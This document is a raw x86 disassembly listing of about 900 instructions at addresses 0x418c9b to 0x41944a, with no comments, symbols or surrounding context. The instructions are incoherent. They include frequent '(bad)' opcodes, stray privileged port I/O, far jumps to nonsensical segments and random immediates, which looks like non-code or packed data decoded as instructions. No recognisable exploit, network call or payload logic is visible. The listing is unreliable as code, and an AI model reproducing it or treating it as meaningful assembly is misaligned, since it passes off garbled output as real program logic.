  418c9b:	mov    ds:0xfe820d4,eax
  418ca0:	add    BYTE PTR [edx-0x53],bl
  418ca3:	and    al,0x7a
  418ca5:	out    0x86,al
  418ca7:	mov    al,ds:0x8f44b238
  418cac:	shr    BYTE PTR [edi+0x12097dc8],cl
  418cb2:	cmp    edx,esi
  418cb4:	dec    ecx
  418cb5:	sbb    DWORD PTR [eax],0xffffff8f
  418cb8:	mov    bl,0x2a
  418cba:	clc    
  418cbb:	cwde   
  418cbc:	jae    0x418c5c
  418cbe:	cmp    cl,BYTE PTR [eax]
  418cc0:	mov    ds:0x354ae1c0,al
  418cc5:	sub    eax,0xd3df84ce
  418cca:	imul   esp,DWORD PTR [edx-0x49],0x56
  418cce:	adc    cl,BYTE PTR [edi+0x2f]
  418cd1:	stos   BYTE PTR es:[edi],al
  418cd2:	jmp    0x418d2c
  418cd4:	js     0x418ca8
  418cd6:	xor    DWORD PTR [esi+0x594c7522],0x24
  418cdd:	clc    
  418cde:	mov    BYTE PTR [edx],cl
  418ce0:	nop
  418ce1:	xchg   ebx,eax
  418ce2:	pusha  
  418ce3:	loopne 0x418c96
  418ce5:	and    al,0x8e
  418ce7:	loop   0x418ce0
  418ce9:	or     cl,bh
  418ceb:	ins    BYTE PTR es:[edi],dx
  418cec:	fimul  DWORD PTR fs:[ecx]
  418cef:	rcr    BYTE PTR [edi],1
  418cf1:	in     eax,0xda
  418cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf4:	(bad)  
  418cf5:	mov    ebp,0x473ce304
  418cfa:	pop    eax
  418cfb:	jne    0x418cb1
  418cfd:	enter  0x3285,0x8e
  418d01:	add    al,0x38
  418d03:	aam    0x67
  418d05:	aam    0x50
  418d07:	and    DWORD PTR [ebx],ebx
  418d09:	or     DWORD PTR [ecx-0x4e],0x71052c3c
  418d10:	jae    0x418d4c
  418d12:	jecxz  0x418cac
  418d14:	fidiv  WORD PTR [eax+0x25]
  418d17:	ja     0x418d5e
  418d19:	jle    0x418ca6
  418d1b:	or     eax,0xfef5ef44
  418d20:	xor    eax,0x98556f61
  418d25:	sbb    eax,0x913ed1e8
  418d2a:	mov    ebp,cs
  418d2c:	pop    edx
  418d2d:	iret   
  418d2e:	xchg   esp,eax
  418d2f:	sub    esi,ebp
  418d31:	or     dh,BYTE PTR [ebp+0x35027fb5]
  418d37:	jg     0x418d94
  418d39:	push   ebp
  418d3a:	cli    
  418d3b:	repnz push ss
  418d3d:	jo     0x418cd4
  418d3f:	adc    eax,0x6a69105f
  418d44:	dec    ecx
  418d45:	jg     0x418ce9
  418d47:	xchg   esi,eax
  418d48:	(bad)  
  418d49:	mov    eax,0x29c7b1d7
  418d4e:	push   edi
  418d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d50:	xstore-rng (bad)
  418d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d52:	inc    edi
  418d53:	ins    WORD PTR es:[edi],dx
  418d55:	mov    bh,0x91
  418d57:	test   esp,ebp
  418d59:	mov    gs,WORD PTR [ebx+0x6a]
  418d5c:	test   BYTE PTR [edx+0x2],bl
  418d5f:	loop   0x418dc1
  418d61:	push   0x69f594a6
  418d66:	and    al,0x1e
  418d68:	xchg   ecx,eax
  418d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d6a:	mov    ds:0xfcb6d6f5,al
  418d6f:	lea    esi,[eax+0x2d]
  418d72:	jbe    0x418d64
  418d74:	cmp    esp,0x3391ef5e
  418d7a:	pop    eax
  418d7b:	add    esp,edi
  418d7d:	outs   dx,DWORD PTR ds:[esi]
  418d7e:	push   esp
  418d7f:	jmp    0x41ca:0xd1ecfd1f
  418d86:	fwait
  418d87:	mov    dh,dh
  418d89:	fisubr WORD PTR [eax]
  418d8b:	pop    ebp
  418d8c:	xchg   esi,eax
  418d8d:	adc    DWORD PTR [eax],esp
  418d8f:	into   
  418d90:	inc    edi
  418d91:	push   es
  418d92:	sti    
  418d93:	dec    edi
  418d94:	(bad)  
  418d95:	repz push esi
  418d97:	cmp    dl,BYTE PTR [ebp-0x20]
  418d9a:	loopne 0x418d74
  418d9c:	ja     0x418de2
  418d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d9f:	call   0x699c5225
  418da4:	in     eax,0x73
  418da6:	inc    ebx
  418da7:	jae    0x418dcc
  418da9:	fdiv   QWORD PTR [ebx+0x47851a4]
  418daf:	nop
  418db0:	xor    ebx,DWORD PTR [ebp+0xd0cc3f2]
  418db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db7:	scas   eax,DWORD PTR es:[edi]
  418db8:	sub    DWORD PTR fs:[ecx-0x10df645e],ebx
  418dbf:	inc    ecx
  418dc0:	call   FWORD PTR [eax+0x3b55490d]
  418dc6:	sbb    DWORD PTR [ecx-0x3350a9ef],ebx
  418dcc:	push   0x47697ef1
  418dd1:	(bad)  
  418dd2:	adc    al,BYTE PTR [ebp+0x7aa85b4f]
  418dd8:	dec    edi
  418dd9:	mov    BYTE PTR [ebp-0x5c],ch
  418ddc:	idiv   ebx
  418dde:	push   edi
  418ddf:	pop    eax
  418de0:	push   ebp
  418de1:	hlt    
  418de2:	(bad)  
  418de3:	jmp    0x1683008f
  418de8:	icebp  
  418de9:	cmp    al,0xbf
  418deb:	std    
  418dec:	dec    edi
  418ded:	int    0x4b
  418def:	pop    eax
  418df0:	cld    
  418df1:	(bad)  
  418df3:	xor    edi,DWORD PTR [ebx+0x74101460]
  418df9:	lds    edi,FWORD PTR [edi+0x58]
  418dfc:	cmc    
  418dfd:	add    BYTE PTR ds:0x84997df1,al
  418e03:	cli    
  418e04:	jl     0x418e34
  418e06:	sbb    eax,0x7b3ba9d3
  418e0b:	mov    esp,0xbd94f520
  418e10:	neg    BYTE PTR [ecx-0x59e43d86]
  418e16:	mov    eax,ds:0xc9b4466d
  418e1b:	jae    0x418e11
  418e1d:	dec    esi
  418e1e:	mov    esi,0xd51a777b
  418e23:	dec    ebx
  418e24:	push   0xffffffae
  418e26:	fsubr  DWORD PTR [ebp+edx*1-0x68]
  418e2a:	mov    eax,ds:0x3b7fa87a
  418e2f:	cmp    eax,0x3934a654
  418e34:	sbb    edi,DWORD PTR [ebx+0x36]
  418e37:	add    al,0xd3
  418e39:	jbe    0x418e0d
  418e3b:	ret    0x8514
  418e3e:	mov    edi,0xe2072f43
  418e43:	dec    esp
  418e44:	cld    
  418e45:	call   FWORD PTR [edi+eiz*1+0x1ffb8e35]
  418e4c:	rol    DWORD PTR [eax-0x80],0x7e
  418e50:	push   ss
  418e51:	xor    edi,DWORD PTR [eax]
  418e53:	mov    bl,0xcd
  418e55:	fcomp  DWORD PTR [eax+0x6d8eda0b]
  418e5b:	dec    esp
  418e5c:	inc    edx
  418e5d:	adc    bh,BYTE PTR [edx]
  418e5f:	add    DWORD PTR [ebp+0x9],ecx
  418e62:	or     esi,edx
  418e64:	aaa    
  418e65:	sbb    bl,BYTE PTR [edi-0x557389dc]
  418e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e6c:	and    BYTE PTR ds:0x70a15aa4,dl
  418e72:	xchg   ecx,eax
  418e73:	imul   esp,DWORD PTR [edi-0x4],0x29bf4c07
  418e7a:	add    dh,bl
  418e7c:	das    
  418e7d:	mov    DWORD PTR [esi],eax
  418e7f:	pop    ds
  418e80:	out    dx,eax
  418e81:	add    al,BYTE PTR [edx-0x74]
  418e84:	jge    0x418ea7
  418e86:	mov    ebx,0x7845d344
  418e8b:	mov    eax,ds:0xcf6e5a1d
  418e90:	loope  0x418e57
  418e92:	cld    
  418e93:	cmc    
  418e94:	mov    bl,0xf5
  418e96:	jbe    0x418e5d
  418e98:	pushf  
  418e99:	aas    
  418e9a:	bound  esp,QWORD PTR [eax]
  418e9c:	lock addr16 push es
  418e9f:	dec    edi
  418ea0:	sub    bl,ch
  418ea2:	(bad)  
  418ea3:	xor    DWORD PTR [edi-0x3a685915],edx
  418ea9:	movlhps xmm0,xmm1
  418eac:	test   edx,ebp
  418eae:	sbb    eax,0x16abf945
  418eb3:	inc    edx
  418eb4:	jo     0x418e87
  418eb6:	sub    ebx,edx
  418eb8:	ja     0x418e8f
  418eba:	add    al,BYTE PTR [esi-0x19]
  418ebd:	xchg   edx,eax
  418ebe:	ret    
  418ebf:	mov    ch,0xed
  418ec1:	jne    0x418e95
  418ec3:	bnd jmp 0xafba711b
  418ec9:	mov    ch,0xe9
  418ecb:	dec    esp
  418ecc:	jle    0x418ebb
  418ece:	cmp    bh,BYTE PTR [edi-0x2e]
  418ed1:	loopne 0x418ebd
  418ed3:	sub    DWORD PTR [ecx],esp
  418ed5:	cs mov edi,0xa22c0b6
  418edb:	sub    edi,DWORD PTR [edx-0x66]
  418ede:	cwde   
  418edf:	stc    
  418ee0:	mov    dh,0x1
  418ee2:	scas   eax,DWORD PTR es:[edi]
  418ee3:	jmp    0x6ef69b0d
  418ee8:	and    ch,BYTE PTR [ecx]
  418eea:	mov    ds:0x30063475,al
  418eef:	push   edx
  418ef0:	nop
  418ef1:	mov    dl,BYTE PTR [ecx-0x4f]
  418ef4:	pop    ds
  418ef5:	loop   0x418edd
  418ef7:	scas   al,BYTE PTR es:[edi]
  418ef8:	add    BYTE PTR [edi],bh
  418efa:	sub    al,0x62
  418efc:	ss clc 
  418efe:	mov    esp,0xc5557b1c
  418f04:	in     eax,dx
  418f05:	xor    ch,BYTE PTR [esi+0x67]
  418f08:	pop    ecx
  418f09:	jg     0x418f62
  418f0b:	mov    esi,0x2a6e180
  418f10:	cmp    ebx,DWORD PTR [ecx-0x6c412bf6]
  418f16:	jp     0x418f85
  418f18:	cmp    BYTE PTR [eax-0x5f4fe2e6],bh
  418f1e:	sub    esi,DWORD PTR [ebp+0x4e5a8946]
  418f24:	test   DWORD PTR [ecx+0x31],edx
  418f27:	add    eax,0x4919a3da
  418f2c:	(bad)  
  418f2d:	push   edi
  418f2e:	rcl    BYTE PTR [ebp+0x6466440],cl
  418f34:	jae    0x418f45
  418f36:	sbb    eax,0xb6364a1a
  418f3b:	push   0xd
  418f3d:	sbb    DWORD PTR [eax+0x5c41a113],ebp
  418f43:	dec    ebx
  418f44:	dec    ebx
  418f45:	stos   BYTE PTR es:[edi],al
  418f46:	and    edi,ebx
  418f48:	std    
  418f49:	sub    eax,0x8b9cf924
  418f4e:	inc    edi
  418f4f:	or     ah,dh
  418f51:	adc    edx,esp
  418f53:	std    
  418f54:	cmp    al,BYTE PTR [edx+ebx*2]
  418f57:	repz dec ecx
  418f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f5a:	lahf   
  418f5b:	imul   ecx,DWORD PTR [ebp-0x2d18abd6],0xa763c2f1
  418f65:	pop    ss
  418f66:	jns    0x418f9d
  418f68:	jnp    0x418f8f
  418f6a:	not    ah
  418f6c:	pop    esi
  418f6d:	mov    eax,ds:0x180119ab
  418f72:	retf   0x6f8f
  418f75:	fstp   st(1)
  418f77:	outs   dx,DWORD PTR ds:[esi]
  418f78:	pop    eax
  418f79:	pop    esp
  418f7a:	aaa    
  418f7b:	(bad)  
  418f7c:	jg     0x418f9c
  418f7e:	pop    esp
  418f7f:	xchg   DWORD PTR [ebx+0xb],esi
  418f82:	call   0x2ffb:0xc88c36e5
  418f89:	inc    ebp
  418f8a:	dec    esp
  418f8b:	and    ecx,DWORD PTR [ebx]
  418f8d:	jl     0x418f4b
  418f8f:	inc    esp
  418f90:	jns    0x418fa3
  418f92:	dec    edi
  418f93:	aad    0x3a
  418f95:	jbe    0x418f33
  418f97:	mov    edx,0xdc3c5149
  418f9c:	and    ebp,DWORD PTR [edx+0x4a]
  418f9f:	mov    edx,0x54c1b3cb
  418fa4:	cs push ss
  418fa6:	adc    al,0x9c
  418fa8:	sub    eax,0x982df330
  418fad:	jne    0x419012
  418faf:	xchg   ebx,eax
  418fb0:	sub    BYTE PTR [esp+edi*2-0x34],ch
  418fb4:	test   ax,0x9c26
  418fb8:	in     eax,0x13
  418fba:	stos   DWORD PTR es:[edi],eax
  418fbb:	sti    
  418fbc:	mov    ebx,0x7d52b5b7
  418fc1:	inc    edx
  418fc2:	mov    bl,0x9d
  418fc4:	mov    dh,0x33
  418fc6:	push   0x1d54d88
  418fcb:	ins    BYTE PTR es:[edi],dx
  418fcc:	lods   eax,DWORD PTR ds:[esi]
  418fcd:	pop    eax
  418fce:	jmp    0xf204:0xfe026932
  418fd5:	loopne 0x418f75
  418fd7:	pop    ss
  418fd8:	int    0x2d
  418fda:	mov    ds:0x917c9439,al
  418fdf:	xor    cl,BYTE PTR [ecx]
  418fe1:	loop   0x418f67
  418fe3:	retf   0xbd28
  418fe6:	mov    eax,0x67fe14a7
  418feb:	dec    edx
  418fec:	imul   edi,DWORD PTR [edx+0x3c],0xe2e1086
  418ff3:	xchg   edx,eax
  418ff4:	adc    al,0xd6
  418ff6:	jge    0x418f94
  418ff8:	jle    0x418f92
  418ffa:	mov    dl,0x98
  418ffc:	inc    ebx
  418ffd:	pop    esp
  418ffe:	xchg   ecx,eax
  418fff:	test   BYTE PTR ds:0x2e4a8fc9,dh
  419005:	jle    0x419005
  419007:	push   ecx
  419008:	aad    0xec
  41900a:	mov    ebp,ecx
  41900c:	add    ah,BYTE PTR [eax+0x14]
  41900f:	stos   DWORD PTR es:[edi],eax
  419010:	sbb    edx,DWORD PTR [ebx-0x26]
  419013:	cld    
  419014:	mov    ecx,0x5dafc185
  419019:	mov    bh,0xc7
  41901b:	pop    ss
  41901c:	sbb    ah,BYTE PTR [eax-0x43944a58]
  419022:	mov    edi,0xe1113812
  419027:	cmp    al,0x2d
  419029:	inc    esp
  41902a:	clc    
  41902b:	in     al,dx
  41902c:	lds    edi,FWORD PTR [eax]
  41902e:	inc    edx
  41902f:	mov    eax,edi
  419031:	fwait
  419032:	sbb    eax,0xf02dac83
  419037:	cld    
  419038:	les    eax,FWORD PTR [eax]
  41903a:	hlt    
  41903b:	lock js 0x419009
  41903e:	outs   dx,BYTE PTR ds:[esi]
  41903f:	push   esi
  419040:	mov    cl,0x95
  419042:	pop    ds
  419043:	rcr    DWORD PTR [edx+0x4f],cl
  419046:	pop    ss
  419047:	and    al,0x69
  419049:	inc    eax
  41904a:	cmp    bh,bh
  41904c:	mov    edx,0xc9408827
  419051:	xchg   edi,eax
  419052:	ss inc ebp
  419054:	icebp  
  419055:	in     al,dx
  419056:	jnp    0x419074
  419058:	loope  0x4190cf
  41905a:	pop    esi
  41905b:	jl     0x418fec
  41905d:	sbb    ebp,ecx
  41905f:	inc    eax
  419060:	xor    ebx,DWORD PTR [edx]
  419062:	mov    ch,0xb7
  419064:	stos   BYTE PTR es:[edi],al
  419065:	clc    
  419066:	cmc    
  419067:	(bad)  
  419068:	repz jno 0x4190da
  41906b:	pushf  
  41906c:	jne    0x419097
  41906e:	nop    edx
  419071:	and    cl,BYTE PTR [edi]
  419073:	lods   al,BYTE PTR ds:[esi]
  419074:	in     eax,0x93
  419076:	cmp    BYTE PTR [ecx-0x6024c2c3],cl
  41907c:	mov    eax,0x9253773d
  419081:	xor    eax,0xbb12d5b5
  419086:	fld    st(0)
  419088:	sub    DWORD PTR [edi-0x47],eax
  41908b:	das    
  41908c:	(bad)  
  41908d:	pop    ecx
  41908e:	retf   
  41908f:	add    al,0x1d
  419091:	out    0x88,eax
  419093:	mov    eax,0xe93215ee
  419098:	cmp    esi,DWORD PTR [eax+0xe]
  41909b:	loope  0x419089
  41909d:	mov    edi,0x51a65b45
  4190a2:	fnstsw WORD PTR [edi]
  4190a4:	jg     0x41911b
  4190a6:	xchg   ebp,eax
  4190a7:	add    DWORD PTR [edx-0x230968d2],0x23d37445
  4190b1:	xor    al,0xf7
  4190b3:	mov    ds:0x6c96b6fb,eax
  4190b8:	icebp  
  4190b9:	stos   DWORD PTR es:[edi],eax
  4190ba:	mov    ds:0x66d71e4a,eax
  4190bf:	fist   DWORD PTR [edx-0x2]
  4190c2:	imul   ecx,DWORD PTR [edx],0xffffff99
  4190c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190c6:	cwde   
  4190c7:	in     eax,0xeb
  4190c9:	inc    esi
  4190ca:	stc    
  4190cb:	fdivrp st(3),st
  4190cd:	xchg   esp,eax
  4190ce:	(bad)  
  4190cf:	(bad)  
  4190d0:	(bad)  
  4190d1:	pop    esp
  4190d2:	sbb    cl,BYTE PTR [ecx]
  4190d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d5:	mov    ?,WORD PTR [esi+eax*8-0x48b4e325]
  4190dc:	add    DWORD PTR [ecx-0x2b00b453],edi
  4190e2:	add    ah,al
  4190e4:	and    BYTE PTR [esi+ebp*8+0x492a7318],cl
  4190eb:	mov    edi,0x310a3a7
  4190f0:	inc    esi
  4190f1:	mov    al,ds:0x8fa682d5
  4190f6:	adc    al,0x51
  4190f8:	popa   
  4190f9:	push   cs
  4190fa:	pop    eax
  4190fb:	pop    edi
  4190fc:	aad    0x31
  4190fe:	pop    ss
  4190ff:	cmp    al,0x4a
  419101:	lock xchg esp,eax
  419103:	or     dl,BYTE PTR [esi-0x7f]
  419106:	(bad)  
  419108:	rcr    edi,1
  41910a:	xchg   BYTE PTR [edx],cl
  41910c:	sbb    BYTE PTR [edi],bl
  41910e:	ja     0x4190ca
  419110:	loope  0x41911d
  419112:	jb     0x419180
  419114:	test   al,0x74
  419116:	int3   
  419117:	daa    
  419118:	jecxz  0x419102
  41911a:	xor    DWORD PTR [esi-0x1f15393d],ebx
  419120:	xchg   esi,eax
  419121:	dec    ecx
  419122:	mov    edx,0x1c284e82
  419127:	bound  esp,QWORD PTR [ebx+0x29b21ab4]
  41912d:	mov    BYTE PTR [edi-0x4d839708],0xd8
  419134:	sub    al,0xaa
  419136:	or     eax,0x4799b9dd
  41913b:	or     BYTE PTR [edx+0x51efbb9d],bl
  419141:	test   eax,0x91b9ec05
  419146:	mov    ebp,0xcf6b8088
  41914b:	or     esi,DWORD PTR [ebx+edx*8+0x49]
  41914f:	jmp    0x41919d
  419151:	dec    edi
  419152:	and    ebx,ebp
  419154:	(bad)  
  419156:	mov    DWORD PTR [edi],ecx
  419158:	sbb    eax,0x28a886a0
  41915d:	jle    0x4190ef
  41915f:	in     al,0xd9
  419161:	iret   
  419162:	addr16 call edx
  419165:	sub    DWORD PTR [edi],esi
  419167:	dec    ebx
  419168:	sub    cl,BYTE PTR [ecx+0x59103d35]
  41916e:	jecxz  0x41915e
  419170:	jne    0x419120
  419172:	inc    eax
  419173:	fs in  al,0xa2
  419176:	bound  ebx,QWORD PTR [esi+0x7fa71ec5]
  41917c:	dec    edx
  41917d:	or     al,0xee
  41917f:	fcomp  st(0)
  419181:	mov    esi,0x787a5349
  419186:	inc    edi
  419187:	xchg   ecx,eax
  419188:	mov    ecx,0x9c758d2a
  41918d:	adc    BYTE PTR [edx+0x4d],0x6e
  419191:	outs   dx,DWORD PTR ds:[esi]
  419192:	mov    ds,WORD PTR [ecx-0x1aaac35a]
  419198:	and    ecx,eax
  41919a:	arpl   bp,bx
  41919c:	or     eax,0xfaa3b427
  4191a1:	rcl    DWORD PTR [ebx-0x38764949],1
  4191a7:	ror    BYTE PTR [ecx+eax*2+0xb4861d1],0xd6
  4191af:	pop    es
  4191b0:	xor    DWORD PTR [esi-0x78],eax
  4191b3:	or     eax,edi
  4191b5:	dec    edi
  4191b6:	push   esp
  4191b7:	xchg   esi,eax
  4191b8:	data16 sbb cl,bl
  4191bb:	and    al,ch
  4191bd:	aas    
  4191be:	cwde   
  4191bf:	int    0x15
  4191c1:	mov    ebp,0xa99869aa
  4191c6:	mov    ah,0x43
  4191c8:	rcl    edx,1
  4191ca:	or     edx,ebx
  4191cc:	daa    
  4191cd:	jp     0x4191c2
  4191cf:	(bad)  
  4191d0:	imul   DWORD PTR [ebx+0x502e258e]
  4191d6:	cmp    eax,0xa49ba70a
  4191db:	call   0x6512df63
  4191e0:	mov    bl,0x7d
  4191e2:	repz repz jo 0x41916b
  4191e6:	pop    es
  4191e7:	cli    
  4191e8:	jl     0x4191d2
  4191ea:	ss in  eax,0x6a
  4191ed:	stos   BYTE PTR es:[edi],al
  4191ee:	cmp    cl,cl
  4191f0:	cmc    
  4191f1:	jno    0x41923b
  4191f3:	sbb    eax,0x116ae6b4
  4191f8:	push   esp
  4191f9:	sub    esp,DWORD PTR [esp+edx*8-0x5c44b2]
  419200:	pop    ebp
  419201:	leave  
  419202:	push   edi
  419203:	(bad)  
  419204:	jns    0x419256
  419206:	xlat   BYTE PTR ds:[ebx]
  419207:	in     al,dx
  419208:	push   esi
  419209:	jne    0x419230
  41920b:	and    cl,BYTE PTR [ebp+0x20006003]
  419211:	cmp    dh,dl
  419213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419214:	cmc    
  419215:	pop    edx
  419216:	xor    cl,cl
  419218:	add    DWORD PTR [ecx+0x570a97aa],0x6037d5dc
  419222:	mov    BYTE PTR [ecx+edx*2-0x22],ah
  419226:	mov    eax,0x8bf190ac
  41922b:	xor    DWORD PTR [edi],edx
  41922d:	bound  eax,QWORD PTR [edx+0x30d27641]
  419233:	cwde   
  419234:	add    al,0x64
  419236:	aas    
  419237:	mov    dl,0xbf
  419239:	cwde   
  41923a:	jge    0x41926e
  41923c:	push   es
  41923d:	sbb    DWORD PTR [edx+0x734a7238],esi
  419243:	fdiv   DWORD PTR [esp+ebp*8-0x6f]
  419247:	loopne 0x4191d2
  419249:	fidiv  DWORD PTR [ecx-0x7f]
  41924c:	jge    0x41922d
  41924e:	into   
  41924f:	lss    edx,FWORD PTR [edx+esi*4]
  419253:	adc    DWORD PTR [eax+eiz*8-0x50],ecx
  419257:	ret    0x113
  41925a:	inc    ecx
  41925b:	jl     0x419219
  41925d:	dec    ebx
  41925e:	fs push ss
  419260:	lahf   
  419261:	add    ah,bh
  419263:	mov    ss,WORD PTR [edx-0x13]
  419266:	rcr    DWORD PTR [edi+0x25],1
  419269:	ret    0xd81a
  41926c:	inc    ebp
  41926d:	xlat   BYTE PTR ds:[ebx]
  41926e:	stos   DWORD PTR es:[edi],eax
  41926f:	and    al,0x38
  419271:	retf   
  419272:	inc    esi
  419273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419274:	xchg   DWORD PTR [ebx],eax
  419276:	stos   DWORD PTR es:[edi],eax
  419277:	cdq    
  419278:	push   0x15
  41927a:	dec    ebp
  41927b:	xchg   esi,eax
  41927c:	push   ebx
  41927d:	jns    0x419246
  41927f:	aad    0x1c
  419281:	pusha  
  419282:	push   esi
  419283:	adc    BYTE PTR [ebp+0x2e4a8c49],bh
  419289:	inc    eax
  41928a:	retf   0x89e1
  41928d:	loopne 0x41928d
  41928f:	lods   eax,DWORD PTR ds:[esi]
  419290:	frstor [ebp+esi*8-0x2a72d5b2]
  419297:	adc    BYTE PTR [edi],0xf1
  41929a:	aam    0xa9
  41929c:	pop    ebx
  41929d:	adc    BYTE PTR [edi],ah
  41929f:	dec    esi
  4192a0:	adc    al,0x5d
  4192a2:	push   eax
  4192a3:	mov    dh,0x28
  4192a5:	repnz sar DWORD PTR [eax+0xffd8ac3],cl
  4192ac:	outs   dx,WORD PTR ds:[esi]
  4192ae:	loope  0x419254
  4192b0:	neg    DWORD PTR [eax*8-0x47b2c6df]
  4192b7:	ficomp WORD PTR [edi+ebp*4-0x2ce4ee39]
  4192be:	and    edi,esp
  4192c0:	mov    cl,0xaa
  4192c2:	xchg   BYTE PTR [esi],bh
  4192c4:	mov    dl,0x8d
  4192c6:	das    
  4192c7:	inc    ecx
  4192c8:	aas    
  4192c9:	inc    ecx
  4192ca:	dec    edx
  4192cb:	lahf   
  4192cc:	mov    BYTE PTR ds:[edx+0xb006493],bh
  4192d3:	xor    BYTE PTR [edx],al
  4192d5:	sbb    al,0x61
  4192d7:	cmc    
  4192d8:	cmp    DWORD PTR [ecx+0x7a1f51ae],esi
  4192de:	fist   DWORD PTR [ecx]
  4192e0:	pop    ds
  4192e1:	popa   
  4192e2:	out    dx,eax
  4192e3:	arpl   WORD PTR [edi],bx
  4192e5:	mov    dh,0x78
  4192e7:	push   esp
  4192e8:	fld    DWORD PTR [esi-0x572a6459]
  4192ee:	xchg   esi,eax
  4192ef:	pop    esp
  4192f0:	pushf  
  4192f1:	cs xor eax,0xc3d22337
  4192f7:	adc    eax,DWORD PTR [ebx-0x345b4cb2]
  4192fd:	pop    ebx
  4192fe:	mov    ch,0x3c
  419300:	aaa    
  419301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419302:	sbb    bl,bl
  419304:	in     eax,dx
  419305:	out    0xee,eax
  419307:	jo     0x41935c
  419309:	and    eax,0x2e31067a
  41930e:	xor    ch,bh
  419310:	outs   dx,DWORD PTR ds:[esi]
  419311:	test   al,0x4
  419313:	(bad)  
  419314:	push   ebx
  419315:	test   DWORD PTR [ecx],ebp
  419317:	cmp    BYTE PTR [edx+0x58936b32],ch
  41931d:	aad    0xe
  41931f:	or     esp,DWORD PTR [ecx]
  419321:	shl    DWORD PTR [esi],1
  419323:	test   BYTE PTR [edi+0x67ad6a2a],al
  419329:	add    dl,BYTE PTR [ecx+0x537025e1]
  41932f:	cmp    BYTE PTR [eax+eax*4+0x500266bb],0xde
  419337:	xchg   esp,eax
  419338:	icebp  
  419339:	out    dx,al
  41933a:	test   eax,ebp
  41933c:	jg     0x4192d5
  41933e:	jle    0x4193a4
  419340:	sahf   
  419341:	out    0xd8,eax
  419343:	and    dh,BYTE PTR [eax+eax*1+0x1a736b63]
  41934a:	in     al,0xb8
  41934c:	adc    BYTE PTR gs:[ebp+0x3c],cl
  419350:	ror    DWORD PTR [ecx-0x9974eb7],1
  419356:	pop    ecx
  419357:	mov    BYTE PTR [edx+0x57c3f486],ch
  41935d:	push   esp
  41935e:	and    ebx,DWORD PTR [eax+0x3d]
  419361:	xor    al,0xf4
  419363:	and    bl,al
  419365:	arpl   di,sp
  419367:	fistp  QWORD PTR [esi+ebx*8+0x54013ad2]
  41936e:	std    
  41936f:	and    eax,0xf576e0f4
  419374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419375:	or     DWORD PTR [bx+di-0x5f],ecx
  419379:	ret    0x9a5e
  41937c:	push   DWORD PTR [ebx+0x4]
  41937f:	cmp    DWORD PTR [edi-0x376dc66b],0x74
  419386:	dec    ebp
  419387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419388:	hlt    
  419389:	xchg   ebp,eax
  41938a:	jnp    0x419344
  41938c:	sbb    al,ch
  41938e:	je     0x41935d
  419390:	outs   dx,DWORD PTR ds:[esi]
  419391:	xchg   esi,eax
  419392:	pusha  
  419393:	mov    ecx,0x285ccc50
  419398:	jmp    0x1de66303
  41939d:	dec    eax
  41939e:	push   cs
  41939f:	cmc    
  4193a0:	bound  eax,QWORD PTR [esi+0x68f861c1]
  4193a6:	add    BYTE PTR [eax+0x3306392e],0x7c
  4193ad:	fiadd  DWORD PTR [eax]
  4193af:	sub    al,0xa0
  4193b1:	cs (bad) 
  4193b3:	fxch   st(3)
  4193b5:	push   eax
  4193b6:	scas   eax,DWORD PTR es:[edi]
  4193b7:	sbb    al,0x63
  4193b9:	push   ebx
  4193ba:	sbb    DWORD PTR ds:0xb51fb19a,ebp
  4193c0:	pop    ebx
  4193c1:	ror    DWORD PTR [edi],cl
  4193c3:	mov    eax,DWORD PTR [eax]
  4193c5:	push   ebp
  4193c6:	sub    DWORD PTR [eax-0x35],edi
  4193c9:	push   edi
  4193ca:	ret    0x8729
  4193cd:	xchg   BYTE PTR [ebp-0x1b],cl
  4193d0:	mov    eax,DWORD PTR [esi-0x3c]
  4193d3:	gs jne 0x41938d
  4193d6:	push   eax
  4193d7:	sub    BYTE PTR [edx+0x5ac70a1e],bh
  4193dd:	or     al,0x68
  4193df:	shr    BYTE PTR [ecx-0x5],1
  4193e2:	xchg   ecx,eax
  4193e3:	lds    ebx,FWORD PTR [esi]
  4193e5:	call   0x8c422028
  4193ea:	bound  esp,QWORD PTR [esi+ecx*2-0x34]
  4193ee:	rcl    ebx,1
  4193f0:	mov    BYTE PTR [esi-0x67],ah
  4193f3:	das    
  4193f4:	xchg   edi,eax
  4193f5:	loop   0x4193c1
  4193f7:	push   eax
  4193f8:	mov    esp,0x4a3cea26
  4193fd:	enter  0x8289,0x21
  419401:	or     bl,BYTE PTR [edx]
  419403:	scas   eax,DWORD PTR es:[edi]
  419404:	js     0x41939d
  419406:	push   cs
  419407:	fisub  DWORD PTR [ebx]
  419409:	dec    eax
  41940a:	mov    bl,0xa0
  41940c:	es mov bl,0x9b
  41940f:	adc    BYTE PTR [ebp+0x1fcad968],0x87
  419416:	sahf   
  419417:	mov    edi,edi
  419419:	iret   
  41941a:	sub    al,0x81
  41941c:	scas   al,BYTE PTR es:[edi]
  41941d:	xchg   ecx,eax
  41941e:	dec    ebp
  41941f:	pop    esp
  419420:	dec    esp
  419421:	lods   al,BYTE PTR ds:[esi]
  419422:	into   
  419423:	ss int 0xed
  419426:	rcl    BYTE PTR [eax-0x21644e1],0xaa
  41942d:	dec    edi
  41942e:	into   
  41942f:	jle    0x4194a8
  419431:	cld    
  419432:	xor    ecx,DWORD PTR [esi+ecx*8+0x14]
  419436:	xchg   esp,eax
  419437:	mov    BYTE PTR [ebx-0x11],0x83
  41943b:	lock add ebx,DWORD PTR gs:[eax]
  41943f:	jl     0x4193d6
  419441:	xchg   esi,eax
  419442:	or     al,0xd7
  419444:	test   BYTE PTR [ebx-0x13],al
  419447:	cld    
  419448:	mov    edi,DWORD PTR [eax]
  41944a:	aad    0xb2
